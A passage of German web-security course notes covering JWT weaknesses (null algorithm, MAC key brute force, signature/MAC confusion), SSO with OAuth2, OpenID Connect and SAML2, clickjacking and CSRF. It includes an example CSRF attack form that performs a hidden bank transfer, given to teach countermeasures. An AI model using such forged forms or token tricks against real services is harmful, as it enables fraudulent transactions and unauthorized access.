ist:</p> <pre><code>verification = algorithm(base64(header) + \".\" + base64(content))\ntoken = base64(header) + \".\" + base64(content) + \".\" + base64(hash)\n</code></pre> <p>Ein Beispiel f\u00fcr einen Token (man kann dabei die drei durch einen . getrennten Base64-Bereiche erkennen. Da es sich um encoded JSON handelt, beginnen die beiden ersten Base64-Bl\u00f6cke immer mit eyJ):</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n</code></pre>"},{"location":"authentication-and-authorization/session_management/#problem-null-algorithmus","title":"Problem: Null-Algorithmus","text":"<p>Ein grundlegendes Problem bei JWT ist, dass die Checksumme nur \u00fcber den content Bereich berechnet wird. Der gesamte header Bereich wird nicht integrit\u00e4tsgesch\u00fctzt. Dies erlaubt es einem Angreifer, die in dem Header vorhandenen Metadaten beliebig zu ver\u00e4ndern.</p> <p>Ein einfacher Angriff gegen\u00fcber JWT das Setzen des alg Parameters innerhalb des Headers auf den NULL-Algorithmus. Dies bedeutet, dass keine Checksumme berechnet, und der dritte Part des JWTs einfach leer bleibt. Dadurch kann der Angreifer den content nun beliebig w\u00e4hlen und verletzt dabei trotzdem keine Integrit\u00e4tsregeln.</p>"},{"location":"authentication-and-authorization/session_management/#probleme-bei-mac-basierter-verifizierung","title":"Probleme bei MAC-basierter Verifizierung","text":"<p>Wenn ein Angreifer einen ausgestellten JWT empf\u00e4ngt (weil er z.B. ein Benutzer einer Webapplikation ist) besitzt er die M\u00f6glichkeit, einen Offline-Brute Force Angriff gegen den Token durchzuf\u00fchren. Der Angreifer besitzt die Eingangsdaten f\u00fcr den MAC (die Base64-codierten header und content Bereiche des Tokens) und kann nun mittels eines Brute-Force Angriffs versuchen, den Schl\u00fcssel des MACs zu erraten.</p> <p>Aus diesem Grund muss bei Einsatz eines MACs immer ein sehr sicherer Schl\u00fcssel gew\u00e4hlt werden.</p>"},{"location":"authentication-and-authorization/session_management/#problem-mac-vs-signature","title":"Problem: MAC vs. Signature","text":"<p>Ein weiteres Problem tritt bei einer Confusion betreffend dem verwendeten Verfahren zur Berechnung der Pr\u00fcfsumme (dritter Bereich des Tokens) auf. Hier gibt es die M\u00f6glichkeit, dass ein Public-Key basiertes Verfahren zur Erstellung einer Signatur oder ein shared-key basiertes Verfahren zur Erstellung eines MACs verwendet wird.</p> <p>Die Methode zur Verifikation eines Tokens wird folgend aufgerufen:</p> <pre><code>validate(token, key)\n</code></pre> <p>Als erster Parameter wird das zu verifizierende Token \u00fcbergeben, als zweiter Parameter wird der zu verwendende Key \u00fcbergeben. Bei einem Signature-basierten Verfahren w\u00fcrde hier der public-key \u00fcbergeben (da die Signatur ja mittels des public-Keys verifiziert wird), bei einem MAC-basierten Verfahren wird hier der shared private key \u00fcbergeben (der f\u00fcr die Berechnung des MACs ben\u00f6tigt wird). Die Selektion des Verfahrens geschieht \u00fcber den alg Parameter im Header des Tokens. Wird ein Signatur-basiertes Verfahren gew\u00e4hlt, ist der Public-Key fast immer \u00f6ffentlich verf\u00fcgbar.</p> <p>Ein Problem tritt nun auf, wenn der Entwickler eines Services davon ausgeht, dass der Client immer ein Signatur-basiertes Verfahren verwenden wird. In dem Fall w\u00fcrde eine naive Implementierung folgenden Code w\u00e4hlen:</p> <pre><code># assume that token is an signature-based token\nvalidate(token, public-key)\n</code></pre> <p>Es wird also der public key verwendet um die Signatur zu \u00fcberpr\u00fcfen.</p> <p>Ein Angreifer kann nun den public key herunterladen und selbst ein neues Token erstellen. Bei diesem setzt er den alg Wert auf MAC, generiert also ein MAC-basiertes Token. Als geheimen Schl\u00fcssel f\u00fcr dieses Token verwendet er den public key der f\u00fcr die \u00dcberpr\u00fcfung der Signatur verwendet wird. Wenn er nun dieses Token an den Service \u00fcbergibt wird folgendes Code-Fragment aufgerufen:</p> <pre><code># token ist ein MAC-basiertes token\n# die validate Funktion wird deswegen versuchen\n# einen MAC zu berechnen und verwendet daf\u00fcr\n# den zweiten Parameter (public-key)\nvalidate(token, public-key)\n</code></pre> <p>Da der Server (hardcoded) annimmt, dass eine Signatur \u00fcberpr\u00fcft wird, wird der public key (den der Angreifer zum Erstellen des MACs verwendet hat) als Schl\u00fcssel \u00fcbergeben. Die validate Funktion liest nun das Token, erkennt, dass dieses MAC-basiert ist und verwendet nun den \u00fcbergebenen Schl\u00fcssel um einen MAC zu berechnen. Dieser ist nun ident zu dem MAC den der Angreifer gespeichert hat und die Operation wird aufgerufen, obwohl der Angreifer darauf keinen Zugriff erhalten sollte.</p> <p>Dieses Problem zeigt, dass der Entwickler des Webservices immer sicherstellen muss, dass das Token den erwarteten Algorithmus (in diesem Fall einen Signatur-basierten Algorithmus) verwendet. Falls das Token hier einen anderen Algorithmus verwendet hat, muss das Token verworfen werden.</p>"},{"location":"authentication-and-authorization/session_management/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Was versteht man unter einem Session-Fixation Angriff?</p> </li> <li> <p>Erkl\u00e4re client- und server-seitige Session-Konzepte. Welche Variante    sollte man aus Sicherheitsgr\u00fcnden w\u00e4hlen und erl\u00e4utere dies.</p> </li> <li> <p>Wie sieht ein guter Umgang mit einer Session aus? Wann wird diese    angelegt, wann gel\u00f6scht. Wie sollte sie implementiert werden?</p> </li> <li> <p>Welche sicherheits-relevenaten Probleme gibt es im Zusammenhang von    Mixed-Content und Session-IDs?</p> </li> <li> <p>Warum sollten Session-ID nie innerhalb der URL (bzw. als HTTP    GET-Parameter) verwendet werden?</p> </li> </ol> <p>[1] Message Authentication Code</p> <p>[2] Ja, es war eine einfachere Zeit. Mittlerweile w\u00fcrde der Inhalt eines Facebook-Kontos auch als kritisch eingesch\u00e4tzt werden.</p> <p>[3] Siehe auch das XSS-Kapitel</p>"},{"location":"authentication-and-authorization/sso/","title":"Federation/Single-Sign on","text":"<p>Werden mehrere Webapplikationen betrieben, entsteht schnell der Wunsch, Benutzerkonten zwischen diesen Applikationen zu synchronisieren. Die Grundidee ist es, ein unified Authentication/Authorization-Konzept \u00fcber mehrere Server hinweg zu implementieren. Potentielle Gr\u00fcnde f\u00fcr den Einsatz einer Single-Sign On oder Federation L\u00f6sung sind:</p> <ul> <li> <p>SSO erlaubt es mehreren Applikationen eine gemeinsame   Login/Logout-L\u00f6sung zu verwenden. Dadurch k\u00f6nnen redundante L\u00f6sungen   eingespart und duplizierte Sicherheitsprobleme vermieden werden.   Nachteil: der Login-Server ist ein Single-Point-of-Failure.</p> </li> <li> <p>Das gesamte Passwort-Management kann aus der Webapplikation   ausgelagert werden. Es m\u00fcssen keine Passw\u00f6rter mehr selbst erhoben,   bearbeitet oder gespeichert werden.</p> </li> <li> <p>Die User-Experience ist angeblich besser. Der Aufwand f\u00fcr einen   Benutzer einen neuen Account anzulegen wird minimiert.</p> </li> <li> <p>Durch den Login-Server k\u00f6nnen weitere Authenticationsservices   implementiert worden sein, z.B. Ausweiskontrolle oder eine   Multi-Faktor-Authentication.</p> </li> </ul>"},{"location":"authentication-and-authorization/sso/#festival-beispiel","title":"Festival-Beispiel","text":"<p>Eine gute Analogie ist ein Musikfestival bei welchem Besucher auf dem Festivalgel\u00e4nde Getr\u00e4nke erwerben k\u00f6nnen. Je nach Alter darf ein Kunde alkoholische oder nicht-alkoholische Getr\u00e4nke kaufen. M\u00fcsste nun jeder Getr\u00e4nkestand bei jeder Bestellung Eintrittskarte und den Ausweis (Altersnachweis) des Besuchers kontrollieren, w\u00fcrde dies zu starken Verz\u00f6gerungen f\u00fchren.</p> <p>Um die Situation zu verbessern, werden beim Festivaleingang die Besucher einmalig bei einem Registrationszelt kontrolliert. Jeder Besucher erh\u00e4lt ein Armband um zu beweisen, dass er eine Eintrittskarte besass. In Abh\u00e4ngigkeit vom Alter bekommen Minderj\u00e4hrige Besucher ein blaues Armband, erwachsene Besucher ein rotes Armband. Anhand dieses Armbands (Token) k\u00f6nnen nun die Getr\u00e4nkest\u00e4nde schnell kontrollieren, ob ein Gast alkoholische Getr\u00e4nke konsumieren darf. Zus\u00e4tzlich wird \u00fcber den Besitz des Bands \u00fcberpr\u00fcft, ob ein Besucher eine Eintrittskarte besass. Falls ein Besucher bei einem Getr\u00e4nkeshop ohne Band ein Getr\u00e4nk kaufen will, wird er zu dem Registrationszelt verwiesen.</p> <p>In diesem Beispiel ist das Registrationszelt der Identity Provider, die Getr\u00e4nkeh\u00e4ndler sind Service Provider, das Armband ein Token und der Besucher der Client.</p> <p>Das Beispiel zeigt auch zwei Probleme von token-basierten L\u00f6sungen. Das Armband gilt f\u00fcr die gesamte Dauer des Festivals (im Folgejahr werden andere Farben verwendet). Es gibt keine M\u00f6glichkeit einen Teil der Armb\u00e4nder nach dem ersten Festivaltag zu invalidieren. Ebenso wird klar, dass jegliche Form von Zugriffskontrolle durch das Armband ersetzt wird. Wollen z.B. ein Vater und Sohn beide Alkohol kaufen, kann der Vater initial den Identit\u00e4tscheck durchf\u00fchren und dann sein Armband an seinen Sohn weitergeben. Der Vater geht danach wiederholt zum Registrationszelt und kauft sich ein zweites Zugangsband. Mit dem ersten Band kann nun der Sohn beliebig Alkohol kaufen ohne dass auff\u00e4llt, dass sein Alter dies eigentlich verbieten sollte. Der alleinige Zeitpunkt der \u00dcberpr\u00fcfung (Authorization) geschieht w\u00e4hrend der Bandausgabe.</p>"},{"location":"authentication-and-authorization/sso/#oauth2","title":"OAuth2","text":"<p>OAuth2 erlaubt es einem Benutzer (Resource Owner) einer Applikation (Client) Zugriff auf Resourcen/Operationen auf einem Server (Resource Server) zu erteilen. Ein Authorization Server wird verwendet um ein Zugriffs-Token f\u00fcr einen definierten Bereich (scope) am Resourcen-Server auszustellen. Zus\u00e4tzlich zu dem Zugriffs-Token wird zumeist auch ein Refresh-Token ausgestellt mit dem ein Client ein neues Zugriffstoken ohne Benutzerinteraktion generieren kann.</p> <p>Da die Rechte eines ausgestellten Token im Normalfall nur w\u00e4hrend der Ausstellung \u00fcberpr\u00fcft werden und danach f\u00fcr die gesamte Lebenszeit des Tokens g\u00fcltig sind, wird bestenfalls eine sehr kurze Lebenszeit im Minutenbereich gew\u00e4hlt. L\u00e4uft das Token ab, kann mit den Refresh-Token ein neues Access-Token angefordert werden. Da hierf\u00fcr keine Benutzerinteraktion ben\u00f6tigt wird, kann dies automatisiert und transparent f\u00fcr den Endbenutzer erfolgen. Der Vorteil liegt darin, dass w\u00e4hrend der Ausstellung durch den Authorisationsserver die angeforderten Rechte des Tokens wiederholt \u00fcberpr\u00fcft werden.</p> <p></p> <p>Ein interessanter Aspekt ist der Zeitpunkt der Authorization: die \u00dcberpr\u00fcfung der eigentlich Zugriffsberechtigung wird durch den Authorization-Server zum Zeitpunkt der Ausstellung des Tokens durchgef\u00fchrt. Bei einem Zugriff auf den Resourcen Server werden die eigentlichen Berechtigungen nicht mehr \u00fcberpr\u00fcft, sondern nur noch getestet ob das \u00fcbergebene Token Zugriff auf die angeforderten Resourcen inkludiert und von einem validen Authorization Server signiert wurde.</p> <p>Das Token besitzt eine Laufzeit und ist bis zum Ende der Laufzeit g\u00fcltig. Da der Resource Server nicht direkt mit dem Authorization Server kommuniziert, gibt es keine M\u00f6glichkeit ein Token zuvorig zu invalidieren. Dies ist problematisch, falls eine lange Laufzeit (z.B. ein Jahr) gew\u00e4hlt wurde und ein Token abhanden gekommen ist. Ein Angreifer mit dem entwendeten Token kann nun bis zum Ende der Laufzeit dieses Token verwenden um auf die Resource zuzugreifen.</p> <p>Um dieses Problem zu entsch\u00e4rfen werden zumeist zwei Tokens generiert: ein Access-Token und ein Refresh-Token. Das Access-Token wird zum Zugriff auf den Resource Server verwendet und besitzt eine sehr kurze Laufzeit, zumeist im Minuten-Bereich. Falls ein Access-Token abgelaufen ist, kann der Client das Refresh-Token verwenden um (ohne Benutzerinteraktion) ein neues Access-Token zu erhalten. Dies verbessert die Sicherheitssituation, da der Authorization-Server vor dem Ausstellen eines Access-Tokens \u00fcberpr\u00fcft, ob das Subject/der User \u00fcberhaupt noch die notwendige Berechtigung besitzt. Dadurch wird das verwundbare Zeitfenster zwar nicht entfernt, aber zumindest reduziert.</p>"},{"location":"authentication-and-authorization/sso/#openid-connect","title":"OpenID Connect","text":"<p>OpenID Connect verwendet OAuth2 um eine Benutzerauthentication durchzuf\u00fchren. Es gibt verschiedene Subprotokolle (flows genannt). Im Allgemeinen funktioniert das OpenID Connect Protokoll auf folgende Weise:</p> <ol> <li> <p>Der Client schickt einen Request zu dem OpenID Provider.</p> </li> <li> <p>Der OpenID Provider authentifiziert den Benutzer, der Benutzer    best\u00e4tigt den Authentication Request.</p> </li> <li> <p>Der OpenID Provider returniert einen ID Token (und zumeist auch    einen Access Token).</p> </li> <li> <p>Der Cient kann das Access Token verwenden um weitere Informationen    \u00fcber den User \u00fcber den UserInfo Endpoint zu erhalten.</p> </li> </ol> <p>Das ID Token ist ein JSON Web Token (JWT), folgende Felder m\u00fcssen in diesem ausgef\u00fcllt werden:</p> <ul> <li>iss: der Aussteller des Tokens. Dieser muss ein https-Endpunkt sein.</li> <li>sub: der subject identifier identifiziert den Benutzer.</li> <li>aud: der Identifier f\u00fcr den Server, der die Authentification anforderte.</li> <li>exp: Ablaufdateum des Tokens.</li> <li>iat: Austellungsdatum des Tokens.</li> </ul> <p>OpenID Connect definiert drei verschiedene flows (code, implicit oder hybrid), ihre Unterschiede werden kurz in folgender Tabelle aufgef\u00fchrt:</p> Eigenschaft Code Implicit Hybrid Authorization Endpoint versendet alle Tokens nein ja nein Token Endpunkt versendet alle Tokens ja nein nein User Agent erh\u00e4lt Tokens ja nein nein Client kann authenticated werden ja nein ja Refresh Tokens k\u00f6nnen verwendet werden ja nein ja Kommunikation geschieht in einem Roundtrip nein ja nein Gro\u00dfteils Server-zu-Server Kommunikation ja nein teilweise <p>F\u00fcr \"normale\" Applikationen wird die Verwendung des code Flows empfohlen.</p>"},{"location":"authentication-and-authorization/sso/#saml2","title":"SAML2","text":"<p>Die Abk\u00fcrzung SAML2 steht f\u00fcr Security Assertion Markup Language (Version 2). Diese XML-basierte Sprache dient zum Austausch von Authentication und Authorization Informationen zwischen mehreren Parteien. Dabei will sich ein Benutzer mittels eines Clients (z.B. Webbrowser) an einem Service Provider (z.B. Webserver) anmelden. Um dies durchzuf\u00fchren wird ein Identity Provider (IdP) bem\u00fcht dieser ist ein Service welches f\u00fcr einen User gegen\u00fcber einem Service Provider authentifiziert und autorisiert; ebenso kann dieser Service einen synchronen Single Sign-Out durchf\u00fchren.</p> <p>Die jeweiligen Operationen werden im SAML2 Jargon h\u00e4ufig Flows genannt. Es gibt Login- und Logout-Flows, beide k\u00f6nnen entweder vom Service Provider oder vom Identity Provider gestartet werden. Diese unterschiedliche Auspr\u00e4gung ist durch unterschiedliche Use-Cases bedingt. Falls ein Betrieb mehrere Websysteme betreibt, die eigenst\u00e4ndig sind (z.B. eine GitLab-Instanz, eine NextCloud-Instanz), diese aber mit einem unified Sign-In versehen will, macht der SP-trigered flow Sinn. Der Benutzer wird beim Login auf z.B. GitLab zu dem IdP weitergeleitet und loggt sich auf diesem ein. Es wird eine Best\u00e4tigung f\u00fcr GitLab generiert (Token) und der User wird automatisch mit diesem Token zu dem GitLab-Server weitergeleitet (auf dem er nun eingeloggt ist). Den IdP-triggered flow w\u00fcrde man eher in einem Portal-Umfeld verwenden: hier gibt es eine initiale Login-Seite und dem Benutzer wird danach ein typisches Portal mit mehreren eigenst\u00e4ndigen aber integrierten Applikationen angezeigt. Wenn er nun auf eine Subapplikation klickt, wird das Token automatisch mit \u00fcbertragen und der User ist in der Subapplikation eingeloggt (ohne zuvor vom SP zum IdP umgeleitet zu werden).</p>"},{"location":"authentication-and-authorization/sso/#saml2-assertions","title":"SAML2 Assertions","text":"<p>Das Herzst\u00fcck von SAML2 sind die Security Assertions die vom IdP ausgestellt werden. Eine solche Assertion beschreibt die Rechte, welche ein User auf einem SP besitzt. Die Assertion wird vom IdP mittels einer public-key basierten Signatur unterschrieben.</p> <p>Typische Elemente einer Assertion w\u00e4ren:</p> <ul> <li> <p>Issuer identifiziert den IdP der diese Assertion ausgestellt hat.</p> </li> <li> <p>Signature beinhaltet die Signatur welche die Integrit\u00e4t der   Security Assertion sichert.</p> </li> <li> <p>Subject beschreibt das identifizierte Objekt, in diesem Fall den   identifizierten User. Der verwendete Identifier (NameId) kann   verschiedene Typen besitzen, h\u00e4ufig wird transient verwendet.   transient beschreibt einen kurzfristigen Identifier, \u00e4hnlich einer   Session-Id, und besitzt den Vorteil, dass auf diese Weise der SP   nicht die genaue Identit\u00e4t des Subjects erf\u00e4hrt.</p> </li> <li> <p>Conditions: beliebig viele Conditions welche den Anwendungsbereich   der Assertion beschr\u00e4nken. Beispiel sind z. b. temporale   Beschr\u00e4nkungen (NotBefore, NotOnOrAfter) oder eine Einschr\u00e4nkung   der Service f\u00fcr welche die Assertion g\u00fcltig sein soll.</p> </li> <li> <p>AttributeStatement: beliebig viele Attribute-Statements welche   optionale Daten an die Assertion anh\u00e4ngen.</p> </li> <li> <p>AuthnStatement beschreibt die Assertion selbst und beinhaltet   einen eindeutigen Identifier f\u00fcr die Assertion (SessionIndex).   Dieser Identifier wird h\u00e4ufig im Zuge des Sign-Out zur   Identifikation der betroffenen Session verwendet.</p> </li> </ul> <p>Bei einem realen Deployment kann die Situation auftreten, dass mehrere Identity Provider verf\u00fcgbar sind und der Service Provider den korrekten IdP selektieren muss. Ein Beispiel w\u00e4re ein Unternehmen welches interne User gegen einem Active Directory und externe User gegen einen \u00f6ffentlichen IdP authentifiziert.</p> <p>Um die Selektion des IdPs zu vereinfachen, gibt es das IdP Discovery Protokoll. Die beiden h\u00e4ufigen Arten des IdP Discoveries sind:</p> <ul> <li> <p>IdP Discovery am SP: der SP selbst kann die User einem IdP zuordnen   und wei\u00df daher, welchen IdP er kontaktieren soll.</p> </li> <li> <p>Delegated IdP Discovery: der SP leitet die Anfrage an einen eigenen   IdP Discovery Service weiter. Dieser identifiziert den zu w\u00e4hlenden   IdP und retourniert diese Information an den SP. Bei diesem   Protokoll muss erw\u00e4hnt werden, dass die gesamte Kommunikation \u00fcber   den Client l\u00e4uft: der SP teilt dem Client mit, dass dieser per HTTP   Redirect den IdP Discovery Service kontaktieren soll (auf diese   Weise erh\u00e4lt der IdP Discovery Service die IP des Clients).</p> </li> </ul>"},{"location":"authentication-and-authorization/sso/#protocol-bindings","title":"Protocol Bindings","text":"<p>SAML2 dient zur Vereinheitlichung bestehender SSO-L\u00f6sung, daher wurde beim Entwurf des Standards auf vielf\u00e4ltige Integrationsm\u00f6glichkeiten in bestehende Netzwerke geachtet. Dementsprechend definiert SAML2 multiple Transportprotokolle, sogenannte Bindings:</p> <ul> <li>HTTP Redirect Binding</li> <li>HTTP POST Binding</li> <li>HTTP Artifact Binding</li> <li>SAML SOAP Binding</li> <li>Reverse SOAP Binding</li> <li>SAML URI Binding</li> </ul> <p>Bei Webbrowser-basierten Flows wird meistens das HTTP Redirect oder das HTTP POST Binding verwendet. Bei dem Redirect binding werden die \u00fcbertragenen SAML Dokumente mittels Base64 codiert und als HTTP Parameter innerhalb von HTTP Redirects verwendet. Da die L\u00e4nge der Parameter durch die jeweiligen Webbrowser limitiert ist, wird dieses Verfahren vor allem f\u00fcr kurze Nachrichten verwendet. HTTP POST basierte Verfahren verpacken die Nachrichten innerhalb von HTML Formularen und umgehen dadurch die Gr\u00f6\u00dfenlimitierung. Um den Fluss zu automatisieren, werden die Formular zumeist mittels JavaScript automatisch versendet.</p>"},{"location":"authentication-and-authorization/sso/#saml2-beispiel-single-sign-on","title":"SAML2-Beispiel: Single Sign-On","text":"<p>Folgende Abbildung zeigt ein Beispiel f\u00fcr ein SP-initiated Single-Sign On welches durch einen Service Provider gestartet und mittels HTTP POST Binding implementiert wurde.</p> <p></p> <p>In diesem Beispiel will ein Client (User Agent) auf einen Service Provider zugreifen und ben\u00f6tigt hierf\u00fcr eine Autorisierung. Nach dem initialen Client-Zugriff (Schritt 1) verwendet der SP zusammen mit dem Client das IdP Discovery Protokoll um den zugeh\u00f6rigen IdP zu identifizieren. Sobald dieser bekannt ist, erstellt der SP einen Authorization Request und teilt diesen (samt der Adresse des IdPs) dem Client mit. Der Client kontaktiert nun den IdP und \u00fcbermittelt den Request.</p> <p>Der IdP authentisiert und autorisiert nun den Client. Falls dies erfolgreich durchgef\u00fchrt wurde, wird eine SAML2 Security Assertion ausgestellt, vom IdP signiert und dem Client mitgeteilt. Da dies ein HTTP POST basierter Flow ist, erstellt der IdP ein HTML Formular, inkludiert in diesem HTML Formular das generierte SAML-Dokument (hidden field) und submitted das Formular automatisch mittels Javascript (Schritt 4). Der Client greift nun auf den SP zu und \u00fcbermittelt die SAML assertion. Der SP verifiziert die Signatur und erstellt eine Session basierend auf den Daten innerhalb der Assertion. Bei Schritt 6 wird (wahrscheinlich, ist implementierungsabh\u00e4ngig) ein Session Cookie gesetzt, dass der Client bei allen weiteren Anfragen an den SP verwendet. Auf diese Weise sind nun alle folgenden Requests authentifiziert und autorisiert.</p>"},{"location":"authentication-and-authorization/sso/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Wie funktioniert der Sign-On Fluss bei SAML2?</p> </li> <li> <p>Wie funktioniert der Authorisierungsfluss bei OAuth2?</p> </li> <li> <p>Wie ist ein JSON Web Token aufgebaut? Welches Problem kann im    Zusammenhang mit Verwechslungen der Signatur und er MAC-Adresse    passieren?</p> </li> <li> <p>Welche Rolle \u00fcbernimmt das IdP Discovery Protokoll innerhalb von    SAML2?</p> </li> <li> <p>Gegeben eine SAML2 Example Assertion, was sagt diese aus (wer ist    issuer? wer ist subject, etc.)?</p> </li> <li> <p>Wie ist das Verh\u00e4ltnis zwischen OIDC und OAuth2?</p> </li> </ol>"},{"location":"client-side-attacks/allgemeines/","title":"Clientseitige Angriffe","text":"<p>Client-seitige Angriffe zielen auf den Web-Browser des Benutzers ab. Da eine Interaktion des Benutzers bei vielen Angriffen ben\u00f6tigt wird, werden sie zumeist im Zuge von Social-Engineering Angriffen eingesetzt. Webserver besitzen die M\u00f6glichkeit, mittels optionaler HTTP Header den Clients Sicherheitspolicies und Verwendungshinweise mitzuteilen; Clients k\u00f6nnen auf diese Weise Schadcode erkennen und filtern.</p>"},{"location":"client-side-attacks/allgemeines/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Erkl\u00e4re Reflected-, Stored- und DOM-Based XSS Angriffe. Welche    Gegenma\u00dfnahmen gibt es und erl\u00e4utere diese.</p> </li> <li> <p>Was sind unvalidated Forwards und Redirects? Wie kann dagegen    gesch\u00fctzt werden?</p> </li> <li> <p>Was sind Reverse Tab Nabbing Angriffe? Welche Absicherungsma\u00dfnahmen    gibt es dagegen?</p> </li> <li> <p>Welche Sicherheitsprobleme k\u00f6nnen bei HTML5 Local Storage auftreten?</p> </li> <li> <p>Wie funktionieren Clickjacking-Angriffe und wie k\u00f6nnen diese    verhindert werden?</p> </li> <li> <p>Wie funktioniert ein CSRF-Angriff? Erl\u00e4utere zwei potentielle    Gegenma\u00dfnahmen?</p> </li> </ol> <p>[1] Das Document-Object-Model beschreibt eine Programmierschnittstelle welche HTML/XML-Daten als Baumstruktur darstellt. Mittels Javascript kann das DOM modifiziert werden um beispielsweise Elemente bzw. deren Attribute hinzuzuf\u00fcgen, entfernen oder zu modifizieren; Eventhandler zu setzen bzw. Events zu feuern; bzw. um CSS zu ver\u00e4ndern.</p> <p>[6] Dies wird als UXSS bezeichnet, siehe auch https://blog.innerht.ml/the-misunderstood-x-xss-protection/.</p>"},{"location":"client-side-attacks/clickjacking/","title":"Clickjacking","text":"<p>Clickjacking wird auch teilweise UI redress attack genannt. Bei diesem Angriff will der Angreifer einen unbedarften Benutzer dazu bringen, eine Webseite zu bedienen. Um dies durchzuf\u00fchren, baut der Angreifer eine eigene, harmlos aussehende, Webseite, welche den identen Bedienfluss wie die Webseite besitzt, die der Angreifer gerne fernsteuern w\u00fcrde. Mittels eines IFrames wird die Opferwebseite \u00fcber die erstellte Webseite des Angreifers gelegt, die Transparenz der Opfer-Webseite wird auf 100% gesetzt.</p> <p>Wenn nun der Benutzer die vermeintliche (vom Angreifer erstellte) Webseite bedient, werden in Wirklichkeit alle Benutzereingaben an die transparente Opfer-Webseite \u00fcbertragen und dadurch diese durch den Benutzer ferngesteuert.</p> <p>Eine gute Abwehrmassnahme gegen Clickjacking ist der X-Frame-Options HTTP Header.</p>"},{"location":"client-side-attacks/clickjacking/#x-frame-options","title":"X-Frame-Options","text":"<p>Der X-Frame-Options Header wird verwendet um dem Webbrowser mitzuteilen, innerhalb welcher Webseiten die eigene Webseite eingebunden werden darf. Dadurch werden Clickjacking-Angriffe unterbunden.</p> <p>Der Webserver kann \u00fcber das Setzen des X-Frame-Options Header auf folgende Werte das Webbrowser-Verhaltensmuster beeinflussen:</p> <ul> <li>DENY: die Webseite darf nicht von anderen Webseiten mittels IFrames eingebunden werden.</li> <li>SAMEORIGIN: die Webseite darf von allen Webseiten mit dem identen Origin eingebunden werden.</li> <li>ALLOW-FROM domain: die Webseite darf explizit von der Domain domain eingebunden werden.</li> </ul> <p>Die Verwendung von X-Frame-Options ist allerdings nicht problemlos. EIn h\u00e4ufiger Fehler ist es, dass bei ALLOW-FROM mehr als ein Origin angegeben wird. Dies kann z.B. geschehen, falls der Entwickler das Inkludieren ausgehend von zwei externen Seiten, oder das Inkludieren ausgehend von der eigenen und von einer externen Seite erw\u00fcnscht. Dies ist mittles X-Frame-Options nicht abbildbar, wird dieses Verhalten gew\u00fcnscht, muss eine Content-Security Policy angewendet werden.</p> <p>Ein weiteres Problem ist Double Framing. Eine Webseite versucht durch Einsatz von SAMEORIGIN das Einbinden durch eine externe Seite zu unterbinden. Der X-Frame-Options Header bezieht sich allerdings immer auf das ,,\u00e4u\u00dferste\u201d IFrame. Wird z.B. auf der eigenen Seite ein IFrame mit einer externen Seite inkludiert, und diese externe Seite inkludiert selbst \u00fcber ein IFrame die eigene Seite, wird diese angezeigt auch wenn dies durch den gesetzten Header als unterbunden gedacht wurde. Auch dies ist nicht einfach \u00fcber X-Frame-Options abbildbar.</p>"},{"location":"client-side-attacks/csrf-attacks/","title":"CSRF Angriffe","text":"<p>CSRF-Angriffe nutzen ein bestehendes Vertrauensverh\u00e4ltnis zwischen dem Web-Browser des Opfers und einem Webserver aus. Das grunds\u00e4tzliche Problem ist, das Webbrowser, bei Requests zu bereits eingeloggten Webservern, automatisch Sessions anh\u00e4ngen. Dabei wird nicht \u00fcberpr\u00fcft, ob der ausgehende Request wirklich vom Benutzer in Auftrag gegeben worden ist.</p> <p>Folgende Schritte w\u00fcrden bei einem typischen CSRF-Szenario passieren:</p> <ol> <li> <p>Der Benutzer (im Folgenden das Opfer genannt) loggt sich bei einem    Webserver ein. Der Webbrowser des Benutzers speichert sich das    Session-Cookie f\u00fcr Folgezugriffe auf diesen Webserver.</p> </li> <li> <p>Der Benutzer surft im Internet und besucht dabei einen durch den    Angreifer kontrollierten Webserver.</p> </li> <li> <p>Auf diesem Webserver befindet sich ein Formular, welches eine    Operation auf dem Webserver, auf dem das Opfer eingeloggt ist,    aufruft.</p> </li> <li> <p>Der Browser des Opfers l\u00e4dt die Webseite vom Webserver des    Angreifers. Das Formular wird entweder durch den unbedarften    Anwender oder durch Javascript automatisch abgesendet.</p> </li> <li> <p>Der Browser des Opfers h\u00e4ngt automatisch das Session-Cookie zu dem    ausgehenden Request hinzu.</p> </li> <li> <p>Der Webserver (auf dem das Opfer eingeloggt war) erh\u00e4lt nun einen    Request mit einer validen Session ausgehend vom Webbrowser des    Opfers. Da dieser Request vollkommen korrekt aussieht, wird dieser    auch exekutiert.</p> </li> </ol> <p>Ein Beispiel f\u00fcr ein HTML Formular welches der Angreifer auf seinem Webserver hinterlegen w\u00fcrden:</p> <pre><code>&lt;form action=\"http://bank.com/transfer.do\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"acct\" value=\"MARIA\"/&gt;\n    &lt;input type=\"hidden\" name=\"amount\" value=\"100000\"/&gt;\n    &lt;input type=\"submit\" value=\"View my pictures\"/&gt;\n&lt;/form&gt;\n</code></pre> <p></p> <p>In diesem Fall wird die Operation <code>http://bank.com/transfer.do</code> mit den Parametern acct und amount aufgerufen. Bei diesem Beispiel wurden die Felder versteckt und der Button mit einem ablenkenden Text beschriftet. Alternativ k\u00f6nnte der Angreifer das Formular auch in einem 1x1 Pixel gro\u00dfem IFrame verstecken und automatisiert mittels Javascript abschicken.</p>"},{"location":"client-side-attacks/csrf-attacks/#gegenmanahmen","title":"Gegenma\u00dfnahmen","text":""},{"location":"client-side-attacks/csrf-attacks/#synchronizer-token-pattern","title":"Synchronizer Token Pattern","text":"<p>Es gibt mehrere Gegenma\u00dfnahmen gegen CSRF-basierte Angriffe, sicherheitstechnisch ist das so genannte Synchronizer Token-Pattern vorzuziehen. Bei diesem f\u00fcgt der Webserver bei jedem Formular ein verstecktes HTML-Feld hinzu, in dieses schreibt der Server einen zuf\u00e4lligen Zahlenwert. Wird eine Operation am Server aufgerufen wird dieses Feld an den Server \u00fcbertragen und dieser vergleicht den \u00fcbertragenen Zahlenwert mit dem vom Server erwarteten Zahlenwert. Falls diese \u00fcbereinstimmen, wird die Operation ausgef\u00fchrt, ansonsten wird die Operation verworfen. Dieser Schutz funktioniert, da der Angreifer auf seinem remote Server den Zahlenwert erraten und in das Angriffs-Formular einf\u00fcgen m\u00fcsste.</p> <p>Damit dieser Schutz verl\u00e4sslich 